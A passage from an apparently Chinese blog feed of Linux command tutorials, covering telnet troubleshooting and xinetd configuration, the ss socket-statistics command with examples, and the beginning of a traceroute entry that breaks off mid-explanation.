www.baidu.comwww.baidu.com/telnet: Temporary failure in name resolution[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;处理这种情况方法： 确认域名是否正确 确认本机的域名解析有关的设置是否正确（/etc/resolv.conf中nameserver的设置是否正确，如果没有，可以使用nameserver 8.8.8.8） 确认防火墙是否放开了UDP53端口的访问（DNS使用UDP协议，端口53，使用iptables-save查看） 实例3：拒绝访问&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# telnet 192.168.120.206Trying 192.168.120.206...telnet: connect to address 192.168.120.206: Connection refusedtelnet: Unable to connect to remote host: Connection refused[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;处理这种情况： 确认ip地址或者主机名是否正确？ 确认端口是否正确，是否默认的23端口 实例4：启动telnet服务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1service xinetd restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637[root@localhost ~]# cd /etc/xinetd.d/[root@localhost xinetd.d]# ll总计 124-rw-r--r-- 1 root root 1157 2011-05-31 chargen-dgram-rw-r--r-- 1 root root 1159 2011-05-31 chargen-stream-rw-r--r-- 1 root root 523 2009-09-04 cvs-rw-r--r-- 1 root root 1157 2011-05-31 daytime-dgram-rw-r--r-- 1 root root 1159 2011-05-31 daytime-stream-rw-r--r-- 1 root root 1157 2011-05-31 discard-dgram-rw-r--r-- 1 root root 1159 2011-05-31 discard-stream-rw-r--r-- 1 root root 1148 2011-05-31 echo-dgram-rw-r--r-- 1 root root 1150 2011-05-31 echo-stream-rw-r--r-- 1 root root 323 2004-09-09 eklogin-rw-r--r-- 1 root root 347 2005-09-06 ekrb5-telnet-rw-r--r-- 1 root root 326 2004-09-09 gssftp-rw-r--r-- 1 root root 310 2004-09-09 klogin-rw-r--r-- 1 root root 323 2004-09-09 krb5-telnet-rw-r--r-- 1 root root 308 2004-09-09 kshell-rw-r--r-- 1 root root 317 2004-09-09 rsync-rw-r--r-- 1 root root 1212 2011-05-31 tcpmux-server-rw-r--r-- 1 root root 1149 2011-05-31 time-dgram-rw-r--r-- 1 root root 1150 2011-05-31 time-stream[root@localhost xinetd.d]# cat krb5-telnet # default: off# description: The kerberized telnet server accepts normal telnet sessions, \# but can also use Kerberos 5 authentication.service telnet&#123; flags = REUSE socket_type = stream wait = no user = root server = /usr/kerberos/sbin/telnetd log_on_failure += USERID disable = yes&#125;[root@localhost xinetd.d]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置参数，通常的配置如下： 123456789101112131415161718192021222324252627service telnet &#123; disable = no #启用 flags = REUSE #socket可重用 socket_type = stream #连接方式为TCP wait = no #为每个请求启动一个进程 user = root #启动服务的用户为root server = /usr/sbin/in.telnetd #要激活的进程 log_on_failure += USERID #登录失败时记录登录用户名 &#125; 如果要配置允许登录的客户端列表，加入 only_from = 192.168.0.2 #只允许192.168.0.2登录 如果要配置禁止登录的客户端列表，加入 no_access = 192.168.0.&#123;2,3,4&#125; #禁止192.168.0.2、192.168.0.3、192.168.0.4登录 如果要设置开放时段，加入 access_times = 9:00-12:00 13:00-17:00 # 每天只有这两个时段开放服务（我们的上班时间：P） 如果你有两个IP地址，一个是私网的IP地址如192.168.0.2，一个是公网的IP地址如218.75.74.83，如果你希望用户只能从私网来登录telnet服务，那么加入 bind = 192.168.0.2 各配置项具体的含义和语法可参考xined配置文件属性说明（man xinetd.conf） 配置端口，修改services文件：# vi /etc/services 找到以下两句 telnet 23/tcp telnet 23/udp 如果前面有#字符，就去掉它。telnet的默认端口是23，这个端口也是黑客端口扫描的主要对象，因此最好将这个端口修改掉，修改的方法很简单，就是将23这个数字修改掉，改成大一点的数字，比如61123。注意，1024以下的端口号是internet保留的端口号，因此最好不要用，还应该注意不要与其它服务的端口冲突。 启动服务：service xinetd restart 实例5：正常telnet&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1telnet 192.168.120.204 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@andy ~]# telnet 192.168.120.204Trying 192.168.120.204...Connected to 192.168.120.204 (192.168.120.204).Escape character is '^]'. localhost (Linux release 2.6.18-274.18.1.el5 #1 SMP Thu Feb 9 12:45:44 EST 2012) (1)login: rootPassword: Login incorrect &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般情况下不允许root从远程登录，可以先用普通账号登录，然后再用su -切到root用户。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ss]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F59.%20Linux%20%E5%91%BD%E4%BB%A4-%20ss%2F</url>
    <content type="text"><![CDATA[Linux 命令- ss&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ss是Socket Statistics的缩写。顾名思义，ss命令可以用来获取socket统计信息，它可以显示和netstat类似的内容。但ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当服务器的socket连接数量变得非常大时，无论是使用netstat命令还是直接cat /proc/net/tcp，执行速度都会很慢。可能你不会有切身的感受，但请相信我，当服务器维持的连接达到上万个的时候，使用netstat等于浪费 生命，而用ss才是节省时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;天下武功唯快不破。ss快的秘诀在于，它利用到了TCP协议栈中tcp_diag。tcp_diag是一个用于分析统计的模块，可以获得Linux 内核中第一手的信息，这就确保了ss的快捷高效。当然，如果你的系统中没有tcp_diag，ss也可以正常运行，只是效率会变得稍慢。（但仍然比 netstat要快。） 1.命令格式12ss [参数]ss [参数] [过滤] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ss(Socket Statistics的缩写)命令可以用来获取 socket统计信息，此命令输出的结果类似于 netstat输出的内容，但它能显示更多更详细的 TCP连接状态的信息，且比 netstat 更快速高效。它使用了 TCP协议栈中 tcp_diag（是一个用于分析统计的模块），能直接从获得第一手内核信息，这就使得 ss命令快捷高效。在没有 tcp_diag，ss也可以正常运行。 3.命令参数 -h, –help 帮助信息 -V, –version 程序版本信息 -n, –numeric 不解析服务名称 -r, –resolve 解析主机名 -a, –all 显示所有套接字（sockets） -l, –listening 显示监听状态的套接字（sockets） -o, –options 显示计时器信息 -e, –extended 显示详细的套接字（sockets）信息 -m, –memory 显示套接字（socket）的内存使用情况 -p, –processes 显示使用套接字（socket）的进程 -i, –info 显示 TCP内部信息 -s, –summary 显示套接字（socket）使用概况 -4, –ipv4 仅显示IPv4的套接字（sockets） -6, –ipv6 仅显示IPv6的套接字（sockets） -0, –packet 显示 PACKET 套接字（socket） -t, –tcp 仅显示 TCP套接字（sockets） -u, –udp 仅显示 UCP套接字（sockets） -d, –dccp 仅显示 DCCP套接字（sockets） -w, –raw 仅显示 RAW套接字（sockets） -x, –unix 仅显示 Unix套接字（sockets） -f, –family=FAMILY 显示 FAMILY类型的套接字（sockets），FAMILY可选，支持 unix, inet, inet6, link, netlink -A, –query=QUERY, –socket=QUERY QUERY := {all|inet|tcp|udp|raw|unix|packet|netlink}[,QUERY] -D, –diag=FILE 将原始TCP套接字（sockets）信息转储到文件 -F, –filter=FILE 从文件中都去过滤器信息 FILTER := [ state TCP-STATE ] [ EXPRESSION ] 4.使用实例实例1：显示TCP连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -t -a &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# ss -t -aState Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 0 127.0.0.1:smux *:* LISTEN 0 0 *:3690 *:* LISTEN 0 0 *:ssh *:* ESTAB 0 0 192.168.120.204:ssh 10.2.0.68:49368 [root@localhost ~]# 实例2：显示 Sockets 摘要&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -s &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# ss -sTotal: 34 (kernel 48)TCP: 4 (estab 1, closed 0, orphaned 0, synrecv 0, timewait 0/0), ports 3Transport Total IP IPv6* 48 - - RAW 0 0 0 UDP 5 5 0 TCP 4 4 0 INET 9 9 0 FRAG 0 0 0 [root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;列出当前的established, closed, orphaned and waiting TCP sockets 实例3：列出所有打开的网络连接端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# ss -lRecv-Q Send-Q Local Address:Port Peer Address:Port 0 0 127.0.0.1:smux *:* 0 0 *:3690 *:* 0 0 *:ssh *:* [root@localhost ~]# 实例4：查看进程使用的socket&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -pl &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# ss -plRecv-Q Send-Q Local Address:Port Peer Address:Port 0 0 127.0.0.1:smux *:* users:(("snmpd",2716,8))0 0 *:3690 *:* users:(("svnserve",3590,3))0 0 *:ssh *:* users:(("sshd",2735,3))[root@localhost ~]# 实例5：找出打开套接字/端口应用程序&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -lp | grep 3306 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# ss -lp|grep 19350 0 *:1935 *:* users:(("fmsedge",2913,18))0 0 127.0.0.1:19350 *:* users:(("fmsedge",2913,17))[root@localhost ~]# ss -lp|grep 33060 0 *:3306 *:* users:(("mysqld",2871,10))[root@localhost ~]# 实例6：显示所有UDP Sockets&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -u -a &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# ss -u -aState Recv-Q Send-Q Local Address:Port Peer Address:Port UNCONN 0 0 127.0.0.1:syslog *:* UNCONN 0 0 *:snmp *:* ESTAB 0 0 192.168.120.203:39641 10.58.119.119:domain [root@localhost ~]# 实例7：显示所有状态为established的SMTP连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -o state established '( dport = :smtp or sport = :smtp )' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost ~]# ss -o state established '( dport = :smtp or sport = :smtp )' Recv-Q Send-Q Local Address:Port Peer Address:Port [root@localhost ~]# 实例8：显示所有状态为Established的HTTP连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -o state established '( dport = :http or sport = :http )' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# ss -o state established '( dport = :http or sport = :http )' Recv-Q Send-Q Local Address:Port Peer Address:Port 0 0 75.126.153.214:2164 192.168.10.42:http [root@localhost ~]# 实例9：列举出处于 FIN-WAIT-1状态的源端口为 80或者 443，目标网络为 193.233.7/24所有 tcp套接字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -o state fin-wait-1 '( sport = :http or sport = :https )' dst 193.233.7/24 实例10：用TCP 状态过滤Sockets:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ss -4 state FILTER-NAME-HERE ss -6 state FILTER-NAME-HERE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost ~]#ss -4 state closing Recv-Q Send-Q Local Address:Port Peer Address:Port 1 11094 75.126.153.214:http 192.168.10.42:4669 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FILTER-NAME-HERE 可以代表以下任何一个： established syn-sent syn-recv fin-wait-1 fin-wait-2 time-wait closed close-wait last-ack listen closing &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;all : 所有以上状态 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;connected : 除了listen and closed的所有状态 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;synchronized :所有已连接的状态除了syn-sent &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;bucket : 显示状态为maintained as minisockets,如：time-wait和syn-recv. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;big : 和bucket相反. 实例11：匹配远程地址和端口号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12345ss dst ADDRESS_PATTERNss dst 192.168.1.5ss dst 192.168.119.113:http ss dst 192.168.119.113:smtp ss dst 192.168.119.113:443 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost ~]# ss dst 192.168.119.113State Recv-Q Send-Q Local Address:Port Peer Address:Port ESTAB 0 0 192.168.119.103:16014 192.168.119.113:20229 ESTAB 0 0 192.168.119.103:16014 192.168.119.113:61056 ESTAB 0 0 192.168.119.103:16014 192.168.119.113:61623 ESTAB 0 0 192.168.119.103:16014 192.168.119.113:60924 ESTAB 0 0 192.168.119.103:16050 192.168.119.113:43701 ESTAB 0 0 192.168.119.103:16073 192.168.119.113:32930 ESTAB 0 0 192.168.119.103:16073 192.168.119.113:49318 ESTAB 0 0 192.168.119.103:16014 192.168.119.113:3844 [root@localhost ~]# ss dst 192.168.119.113:httpState Recv-Q Send-Q Local Address:Port Peer Address:Port [root@localhost ~]# ss dst 192.168.119.113:3844State Recv-Q Send-Q Local Address:Port Peer Address:Port ESTAB 0 0 192.168.119.103:16014 192.168.119.113:3844 [root@localhost ~]# 实例12：匹配本地地址和端口号&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 123456ss src ADDRESS_PATTERNss src 192.168.119.103ss src 192.168.119.103:httpss src 192.168.119.103:80ss src 192.168.119.103:smtpss src 192.168.119.103:25 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost ~]# ss src 192.168.119.103:16021State Recv-Q Send-Q Local Address:Port Peer Address:Port ESTAB 0 0 192.168.119.103:16021 192.168.119.201:63054 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:62894 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:63055 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:2274 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:44784 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:7233 ESTAB 0 0 192.168.119.103:16021 192.168.119.103:58660 ESTAB 0 0 192.168.119.103:16021 192.168.119.201:44822 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:56737 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:57487 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:56736 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:64652 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:56586 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:64653 ESTAB 0 0 192.168.119.103:16021 10.2.1.206:56587 [root@localhost ~]# 实例13：将本地或者远程端口和一个数比较&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12ss dport OP PORT ss sport OP PORT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# ss sport = :http [root@localhost ~]# ss dport = :http [root@localhost ~]# ss dport \&gt; :1024 [root@localhost ~]# ss sport \&gt; :1024 [root@localhost ~]# ss sport \&lt; :32000 [root@localhost ~]# ss sport eq :22 [root@localhost ~]# ss dport != :22 [root@localhost ~]# ss state connected sport = :http [root@localhost ~]# ss \( sport = :http or sport = :https \) [root@localhost ~]# ss -o state fin-wait-1 \( sport = :http or sport = :https \) dst 192.168.1/24 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ss dport OP PORT 远程端口和一个数比较；ss sport OP PORT 本地端口和一个数比较。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;OP 可以代表以下任意一个: &lt;= or le : 小于或等于端口号 = or ge : 大于或等于端口号 == or eq : 等于端口号 != or ne : 不等于端口号 &lt; or lt : 小于端口号 or gt : 大于端口号 实例14：ss 和 netstat 效率对比&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12time netstat -attime ss &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# time ss real 0m0.739suser 0m0.019ssys 0m0.013s[root@localhost ~]# [root@localhost ~]# time netstat -atreal 2m45.907suser 0m0.063ssys 0m0.067s[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用time 命令分别获取通过netstat和ss命令获取程序和概要占用资源所使用的时间。在服务器连接数比较多的时候，netstat的效率完全没法和ss比。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- traceroute]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F57.%20Linux%20%E5%91%BD%E4%BB%A4-%20traceroute%2F</url>
    <content type="text"><![CDATA[Linux 命令- traceroute&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过traceroute我们可以知道信息从你的计算机到互联网另一端的主机是走的什么路径。当然每次数据包由某一同样的出发点（source）到达某一同样的目的地(destination)走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的。linux系统中，我们称之为traceroute,在MS Windows中为tracert。 traceroute通过发送小的数据包到目的设备直到其返回，来测量其需要多长时间。一条路径上的每个设备traceroute要测3次。输出结果中包括每次测试的时间(ms)和设备的名称（如有的话）及其IP地址。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在大多数情况下，我们会在linux主机系统下，直接执行命令行： 1traceroute hostname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而在Windows系统下是执行tracert的命令： 1tracert hostname 1.命令格式1traceroute [参数] [主机] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;traceroute指令让你追踪网络数据包的路由途径，预设数据包大小是40Bytes，用户可另行设置。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;具体参数格式： 1traceroute [-dFlnrvx][-f&lt;存活数值&gt;][-g&lt;网关&gt;...][-i&lt;网络界面&gt;][-m&lt;存活数值&gt;][-p&lt;通信端口&gt;][-s&lt;来源地址&gt;][-t&lt;服务类型&gt;][-w&lt;超时秒数&gt;][主机名称或IP地址][数据包大小] 3.命令参数 -d 使用Socket层级的排错功能。 -f 设置第一个检测数据包的存活数值TTL的大小。 -F 设置勿离断位。 -g 设置来源路由网关，最多可设置8个。 -i 使用指定的网络界面送出数据包。 -I 使用ICMP回应取代UDP资料信息。 -m 设置检测数据包的最大存活数值TTL的大小。 -n 直接使用IP地址而非主机名称。 -p 设置UDP传输协议的通信端口。 -r 忽略普通的Routing Table，直接将数据包送到远端主机上。 -s 设置本地主机送出数据包的IP地址。 -t 设置检测数据包的TOS数值。 -v 详细显示指令的执行过程。 -w 设置等待远端主机回报的时间。 -x 开启或关闭数据包的正确性检验。 4.使用实例实例1：traceroute 用法简单、最常用的用法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# traceroute www.baidu.comtraceroute to www.baidu.com (61.135.169.125), 30 hops max, 40 byte packets 1 192.168.74.2 (192.168.74.2) 2.606 ms 2.771 ms 2.950 ms 2 211.151.56.57 (211.151.56.57) 0.596 ms 0.598 ms 0.591 ms 3 211.151.227.206 (211.151.227.206) 0.546 ms 0.544 ms 0.538 ms 4 210.77.139.145 (210.77.139.145) 0.710 ms 0.748 ms 0.801 ms 5 202.106.42.101 (202.106.42.101) 6.759 ms 6.945 ms 7.107 ms 6 61.148.154.97 (61.148.154.97) 718.908 ms * bt-228-025.bta.net.cn (202.106.228.25) 5.177 ms 7 124.65.58.213 (124.65.58.213) 4.343 ms 4.336 ms 4.367 ms 8 202.106.35.190 (202.106.35.190) 1.795 ms 61.148.156.138 (61.148.156.138) 1.899 ms 1.951 ms 9 * * *30 * * *[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;记录按序列号从1开始，每个纪录就是一跳 ，每跳表示一个网关，我们看到每行有三个时间，单位是 ms，其实就是-q的默认参数。探测数据包向每个网关发送三个数据包后，网关响应后返回的时间；如果您用 traceroute -q 4 www.58.com ，表示向每个网关发送4个数据包。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时我们traceroute 一台主机时，会看到有一些行是以星号表示的。出现这样的情况，可能是防火墙封掉了ICMP的返回信息，所以我们得不到什么相关的数据包返回数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有时我们在某一网关处延时比较长，有可能是某台网关比较阻塞，也可能是物理设备本身的原因。当然如果某台DNS出现问题时，不能解析主机名、域名时，也会 有延时长的现象；您可以加-n 参数来避免DNS解析，以IP格式输出数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果在局域网中的不同网段之间，我们可以通过traceroute 来排查问题所在，是主机的问题还是网关的问题。如果我们通过远程来访问某台服务器遇到问题时，我们用到traceroute 追踪数据包所经过的网关，提交IDC服务商，也有助于解决问题；但目前看来在国内解决这样的问题是比较困难的，就是我们发现问题所在，IDC服务商也不可能帮助我们解决。 实例2：跳数设置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -m 10 www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# traceroute -m 10 www.baidu.comtraceroute to www.baidu.com (61.135.169.105), 10 hops max, 40 byte packets 1 192.168.74.2 (192.168.74.2) 1.534 ms 1.775 ms 1.961 ms 2 211.151.56.1 (211.151.56.1) 0.508 ms 0.514 ms 0.507 ms 3 211.151.227.206 (211.151.227.206) 0.571 ms 0.558 ms 0.550 ms 4 210.77.139.145 (210.77.139.145) 0.708 ms 0.729 ms 0.785 ms 5 202.106.42.101 (202.106.42.101) 7.978 ms 8.155 ms 8.311 ms 6 bt-228-037.bta.net.cn (202.106.228.37) 772.460 ms bt-228-025.bta.net.cn (202.106.228.25) 2.152 ms 61.148.154.97 (61.148.154.97) 772.107 ms 7 124.65.58.221 (124.65.58.221) 4.875 ms 61.148.146.29 (61.148.146.29) 2.124 ms 124.65.58.221 (124.65.58.221) 4.854 ms 8 123.126.6.198 (123.126.6.198) 2.944 ms 61.148.156.6 (61.148.156.6) 3.505 ms 123.126.6.198 (123.126.6.198) 2.885 ms 9 * * *10 * * *[root@localhost ~]# 实例3：显示IP地址，不查主机名&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -n www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425[root@localhost ~]# traceroute -n www.baidu.comtraceroute to www.baidu.com (61.135.169.125), 30 hops max, 40 byte packets 1 211.151.74.2 5.430 ms 5.636 ms 5.802 ms 2 211.151.56.57 0.627 ms 0.625 ms 0.617 ms 3 211.151.227.206 0.575 ms 0.584 ms 0.576 ms 4 210.77.139.145 0.703 ms 0.754 ms 0.806 ms 5 202.106.42.101 23.683 ms 23.869 ms 23.998 ms 6 202.106.228.37 247.101 ms * * 7 61.148.146.29 5.256 ms 124.65.58.213 4.386 ms 4.373 ms 8 202.106.35.190 1.610 ms 61.148.156.138 1.786 ms 61.148.3.34 2.089 ms 9 * * *30 * * *[root@localhost ~]# traceroute www.baidu.comtraceroute to www.baidu.com (61.135.169.125), 30 hops max, 40 byte packets 1 211.151.74.2 (211.151.74.2) 4.671 ms 4.865 ms 5.055 ms 2 211.151.56.57 (211.151.56.57) 0.619 ms 0.618 ms 0.612 ms 3 211.151.227.206 (211.151.227.206) 0.620 ms 0.642 ms 0.636 ms 4 210.77.139.145 (210.77.139.145) 0.720 ms 0.772 ms 0.816 ms 5 202.106.42.101 (202.106.42.101) 7.667 ms 7.910 ms 8.012 ms 6 bt-228-025.bta.net.cn (202.106.228.25) 2.965 ms 2.440 ms 61.148.154.97 (61.148.154.97) 431.337 ms 7 124.65.58.213 (124.65.58.213) 5.134 ms 5.124 ms 5.044 ms 8 202.106.35.190 (202.106.35.190) 1.917 ms 2.052 ms 2.059 ms 9 * * *30 * * *[root@localhost ~]# 实例4：探测包使用的基本UDP端口设置6888&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -p 6888 www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789[root@localhost ~]# traceroute -p 6888 www.baidu.comtraceroute to www.baidu.com (220.181.111.147), 30 hops max, 40 byte packets 1 211.151.74.2 (211.151.74.2) 4.927 ms 5.121 ms 5.298 ms 2 211.151.56.1 (211.151.56.1) 0.500 ms 0.499 ms 0.509 ms 3 211.151.224.90 (211.151.224.90) 0.637 ms 0.631 ms 0.641 ms 4 * * * 5 220.181.70.98 (220.181.70.98) 5.050 ms 5.313 ms 5.596 ms 6 220.181.17.94 (220.181.17.94) 1.665 ms !X * *[root@localhost ~]# 实例5：把探测包的个数设置为值4&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -q 4 www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# traceroute -q 4 www.baidu.comtraceroute to www.baidu.com (61.135.169.125), 30 hops max, 40 byte packets 1 211.151.74.2 (211.151.74.2) 40.633 ms 40.819 ms 41.004 ms 41.188 ms 2 211.151.56.57 (211.151.56.57) 0.637 ms 0.633 ms 0.627 ms 0.619 ms 3 211.151.227.206 (211.151.227.206) 0.505 ms 0.580 ms 0.571 ms 0.569 ms 4 210.77.139.145 (210.77.139.145) 0.753 ms 0.800 ms 0.853 ms 0.904 ms 5 202.106.42.101 (202.106.42.101) 7.449 ms 7.543 ms 7.738 ms 7.893 ms 6 61.148.154.97 (61.148.154.97) 316.817 ms bt-228-025.bta.net.cn (202.106.228.25) 3.695 ms 3.672 ms * 7 124.65.58.213 (124.65.58.213) 3.056 ms 2.993 ms 2.960 ms 61.148.146.29 (61.148.146.29) 2.837 ms 8 61.148.3.34 (61.148.3.34) 2.179 ms 2.295 ms 2.442 ms 202.106.35.190 (202.106.35.190) 7.136 ms 9 * * * *30 * * * *[root@localhost ~]# 实例6：绕过正常的路由表，直接发送到网络相连的主机&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -r www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# traceroute -r www.baidu.comtraceroute to www.baidu.com (61.135.169.125), 30 hops max, 40 byte packetsconnect: 网络不可达[root@localhost ~]# 实例7：把对外发探测包的等待响应时间设置为3秒&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1traceroute -w 3 www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost ~]# traceroute -w 3 www.baidu.comtraceroute to www.baidu.com (61.135.169.105), 30 hops max, 40 byte packets 1 211.151.74.2 (211.151.74.2) 2.306 ms 2.469 ms 2.650 ms 2 211.151.56.1 (211.151.56.1) 0.621 ms 0.613 ms 0.603 ms 3 211.151.227.206 (211.151.227.206) 0.557 ms 0.560 ms 0.552 ms 4 210.77.139.145 (210.77.139.145) 0.708 ms 0.761 ms 0.817 ms 5 202.106.42.101 (202.106.42.101) 7.520 ms 7.774 ms 7.902 ms 6 bt-228-025.bta.net.cn (202.106.228.25) 2.890 ms 2.369 ms 61.148.154.97 (61.148.154.97) 471.961 ms 7 124.65.58.221 (124.65.58.221) 4.490 ms 4.483 ms 4.472 ms 8 123.126.6.198 (123.126.6.198) 2.948 ms 61.148.156.6 (61.148.156.6) 7.688 ms 7.756 ms 9 * * *30 * * *[root@localhost ~]# Traceroute的工作原理：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Traceroute最简单的基本用法是：traceroute hostname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Traceroute程序的设计是利用ICMP及IP header的TTL（Time To Live）栏位（field）。首先，traceroute送出一个TTL是1的IP datagram（其实，每次送出的为3个40字节的包，包括源地址，目的地址和包发出的时间标签）到目的地，当路径上的第一个路由器（router）收到这个datagram时，它将TTL减1。此时，TTL变为0了，所以该路由器会将此datagram丢掉，并送回一个「ICMP time exceeded」消息（包括发IP包的源地址，IP包的所有内容及路由器的IP地址），traceroute 收到这个消息后，便知道这个路由器存在于这个路径上，接着traceroute 再送出另一个TTL是2 的datagram，发现第2 个路由器…… traceroute 每次将送出的datagram的TTL 加1来发现另一个路由器，这个重复的动作一直持续到某个datagram 抵达目的地。当datagram到达目的地后，该主机并不会送回ICMP time exceeded消息，因为它已是目的地了，那么traceroute如何得知目的地到达了呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Traceroute在送出UDP datagrams到目的地时，它所选择送达的port number 是一个一般应用程序都不会用的号码（30000 以上），所以当此UDP datagram 